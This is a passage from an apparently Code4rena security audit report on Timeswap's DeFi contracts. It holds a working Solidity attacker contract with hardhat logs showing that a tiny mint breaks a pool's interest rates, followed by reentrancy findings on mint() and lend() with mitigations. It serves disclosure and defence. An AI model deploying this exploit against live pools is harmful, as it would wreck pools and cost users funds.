class=\"mtk1\"> </span><span class=\"mtk10\">IERC20</span><span class=\"mtk1\">{</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">mmint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">Attacker</span><span class=\"mtk1\"> </span><span class=\"mtk12\">is</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ITimeswapMintCallback</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint112</span><span class=\"mtk1\"> </span><span class=\"mtk12\">constant</span><span class=\"mtk1\"> </span><span class=\"mtk12\">SEC_PER_YEAR</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">31556926</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">TestTokenAtt</span><span class=\"mtk1\"> </span><span class=\"mtk12\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk12\">jtok</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">TestTokenAtt</span><span class=\"mtk1\"> </span><span class=\"mtk12\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk12\">usdc</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">constructor</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_jtok</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_usdc</span><span class=\"mtk1\">){</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">jtok</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">TestTokenAtt</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_jtok</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">jtok</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mmint</span><span class=\"mtk1\">(</span><span class=\"mtk7\">10_000</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">usdc</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">TestTokenAtt</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_usdc</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">usdc</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mmint</span><span class=\"mtk1\">(</span><span class=\"mtk7\">10_000</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">timeswapMint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">maturity</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint112</span><span class=\"mtk1\"> </span><span class=\"mtk12\">APR</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">pairAddress</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\">{</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">maturity</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">maturity</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;Maturity: &quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">maturity</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">liquidityTo</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">dueTo</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint112</span><span class=\"mtk1\"> </span><span class=\"mtk12\">xIncrease</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">3</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint112</span><span class=\"mtk1\"> </span><span class=\"mtk12\">yIncrease</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">1000000000000000</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint112</span><span class=\"mtk1\"> </span><span class=\"mtk12\">zIncrease</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">5</span><span class=\"mtk1\">; </span><span class=\"mtk3\">//Static 167% CDP</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">IPair</span><span class=\"mtk1\">(</span><span class=\"mtk12\">pairAddress</span><span class=\"mtk1\">).</span><span class=\"mtk11\">mint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">maturity</span><span class=\"mtk1\">, </span><span class=\"mtk12\">liquidityTo</span><span class=\"mtk1\">, </span><span class=\"mtk12\">dueTo</span><span class=\"mtk1\">, </span><span class=\"mtk12\">xIncrease</span><span class=\"mtk1\">, </span><span class=\"mtk12\">yIncrease</span><span class=\"mtk1\">, </span><span class=\"mtk12\">zIncrease</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">timeswapMintCallback</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint112</span><span class=\"mtk1\"> </span><span class=\"mtk12\">assetIn</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint112</span><span class=\"mtk1\"> </span><span class=\"mtk12\">collateralIn</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">data</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ) </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">external</span><span class=\"mtk1\">{</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">jtok</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mmint</span><span class=\"mtk1\">(</span><span class=\"mtk7\">100_000</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">usdc</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mmint</span><span class=\"mtk1\">(</span><span class=\"mtk7\">100_000</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;Asset requested:&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">assetIn</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;Collateral requested:&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">collateralIn</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">//check before</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">beforeJtok</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">jtok</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;Attacker jtok before&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">beforeJtok</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">//transfer</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">jtok</span><span class=\"mtk1\">.</span><span class=\"mtk11\">transfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">assetIn</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">//check after</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">afterJtok</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">jtok</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;Attacker jtok after&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">afterJtok</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">//check before</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">beforeUsdc</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">usdc</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;Attacker USDC  before&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">beforeUsdc</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">//transfer</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">usdc</span><span class=\"mtk1\">.</span><span class=\"mtk11\">transfer</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">collateralIn</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">//check after</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">afterUsdc</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">usdc</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;Attacker USDC After&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">afterUsdc</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>Which contains the following settings for a mint:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"7\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint112</span><span class=\"mtk1\"> </span><span class=\"mtk12\">xIncrease</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">3</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint112</span><span class=\"mtk1\"> </span><span class=\"mtk12\">yIncrease</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">1000000000000000</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint112</span><span class=\"mtk1\"> </span><span class=\"mtk12\">zIncrease</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">5</span><span class=\"mtk1\">; </span><span class=\"mtk3\">//Static 167% CDP</span></span></span></code></pre>\n<p>According to my logs in hardhat:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"8\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">Maturity:  1641859791</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">Callback before: 8333825816710789998373</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">Asset requested: 3</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">Collateral requested: 6</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">Attacker jtok before 5000000000000000000000</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">Attacker jtok after 5000000000000000000003</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">Attacker USDC  before 8333825816710789998373</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">Attacker USDC After 8333825816710789998379</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">Callback after: 8333825816710789998379</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">Callback expected after: 8333825816710789998379</span></span></code></pre>\n<p>The attacker is only required to pay 3 wei of Asset Token and 6 wei of Collateral token. However, after the attacker’s malicious mint is up, the interest rate becomes:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"9\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">yMax: 0.0002047533146923118</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">Min Interest Rate: 0.40383657499999975</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">Max Interest Rate: 6.461385199999996</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">zMax: 1666.6666666666667</span></span></code></pre>\n<p>Between 40 and 646 percent.</p>\n<p>xyz values before and after:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"10\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">Post LP Constants: [ BigNumber { value: &quot;5000000000000000000000&quot; },</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  BigNumber { value: &quot;23766573461559&quot; },</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  BigNumber { value: &quot;8333333333333333333333&quot; },</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  x: BigNumber { value: &quot;5000000000000000000000&quot; },</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  y: BigNumber { value: &quot;23766573461559&quot; },</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  z: BigNumber { value: &quot;8333333333333333333333&quot; } ]</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">Attacker Jtok: 10000000000000000000000</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">Attacker USDC: 10000000000000000000000</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">Post Attack Constants: [ BigNumber { value: &quot;5000000000000000000003&quot; },</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  BigNumber { value: &quot;1023766573461559&quot; },</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  BigNumber { value: &quot;8333333333333333333338&quot; },</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  x: BigNumber { value: &quot;5000000000000000000003&quot; },</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  y: BigNumber { value: &quot;1023766573461559&quot; },</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  z: BigNumber { value: &quot;8333333333333333333338&quot; } ]</span></span></code></pre>\n<p>This result in destruction of the pool.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-01-timeswap-findings/issues/187\">Mathepreneur (Timeswap) confirmed</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-01-timeswap-findings/issues/187#issuecomment-1010049204\">CloudEllie (C4) commented</a>:</strong></p>\n<blockquote>\n<p>Warden rhynorater requested that we add to his submission.  See comment for details.</p>\n</blockquote>\n<h2 id=\"h-04-important-state-updates-are-made-after-the-callback-in-the-mint-function-\" style=\"position:relative;\"><a href=\"#h-04-important-state-updates-are-made-after-the-callback-in-the-mint-function-\" aria-label=\"h 04 important state updates are made after the callback in the mint function  permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-01-timeswap-findings/issues/4\">[H-04] Important state updates are made after the callback in the mint() function </a></h2>\n<p><em>Submitted by jayjonah8</em></p>\n<p>In TimeswapPair.sol, the <code>mint()</code> function has a callback in the middle of the function while there are still updates to state that take place after the callback.  The lock modifier guards against reentrancy but not against cross function reentrancy.  Since the protocol implements Uniswap like functionality,  this can be extremely dangerous especially with regard to composability/interacting with other protocols and contracts.  The callback before important state changes (updates to reserve asset, collateral, and totalDebtCreated) also violates the Checks Effects Interactions best practices further widening the attack surface.</p>\n<h4 id=\"proof-of-concept-2\" style=\"position:relative;\"><a href=\"#proof-of-concept-2\" aria-label=\"proof of concept 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h4>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L177\">https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L177</a></li>\n<li><a href=\"https://fravoll.github.io/solidity-patterns/checks_effects_interactions.html\">https://fravoll.github.io/solidity-patterns/checks_effects_interactions.html</a></li>\n<li>cross function reentrancy\n<a href=\"https://medium.com/coinmonks/protect-your-solidity-smart-contracts-from-reentrancy-attacks-9972c3af7c21\">https://medium.com/coinmonks/protect-your-solidity-smart-contracts-from-reentrancy-attacks-9972c3af7c21</a></li>\n</ul>\n<h4 id=\"recommended-mitigation-steps\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps\" aria-label=\"recommended mitigation steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h4>\n<p>The callback Callback.mint(asset, collateral, xIncrease, dueOut.collateral, data) should be placed at the end of the mint() function after all state updates have taken place.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-01-timeswap-findings/issues/4\">Mathepreneur (Timeswap) confirmed and resolved</a>:</strong></p>\n<blockquote>\n<p><a href=\"https://github.com/Timeswap-Labs/Timeswap-V1-Core/pull/107\">https://github.com/Timeswap-Labs/Timeswap-V1-Core/pull/107</a></p>\n</blockquote>\n<h2 id=\"h-05-in-the-lend-function-state-updates-are-made-after-the-callback-\" style=\"position:relative;\"><a href=\"#h-05-in-the-lend-function-state-updates-are-made-after-the-callback-\" aria-label=\"h 05 in the lend function state updates are made after the callback  permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-01-timeswap-findings/issues/5\">[H-05] In the lend() function state updates are made after the callback </a></h2>\n<p><em>Submitted by jayjonah8</em></p>\n<p>In TimeswapPair.sol, the <code>lend()</code> function has a callback to the msg.sender in the middle of the function while there are still updates to state that take place after the callback.  The lock modifier guards against reentrancy but not against cross function reentrancy.  Since the protocol implements Uniswap like functionality,  this can be extremely dangerous especially with regard to composability/interacting with other protocols and contracts.  The callback before important state changes (updates to totalClaims bonds,  insurance and reserves assets) also violates the Checks Effects Interactions best practices further widening the attack surface.</p>\n<h4 id=\"proof-of-concept-3\" style=\"position:relative;\"><a href=\"#proof-of-concept-3\" aria-label=\"proof of concept 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h4>\n<ul>\n<li><a href=\"https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L246\">https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L246</a></li>\n<li><a href=\"https://fravoll.github.io/solidity-patterns/checks_effects_interactions.html\">https://fravoll.github.io/solidity-patterns/checks_effects_interactions.html</a></li>\n<li>cross function reentrancy\n<a href=\"https://medium.com/coinmonks/protect-your-solidity-smart-contracts-from-reentrancy-attacks-9972c3af7c21\">https://medium.com/coinmonks/protect-your-solidity-smart-contracts-from-reentrancy-attacks-9972c3af7c21</a></li>\n</ul>\n<h4 id=\"recommended-mitigation-steps-1\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-1\" aria-label=\"recommended mitigation steps 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 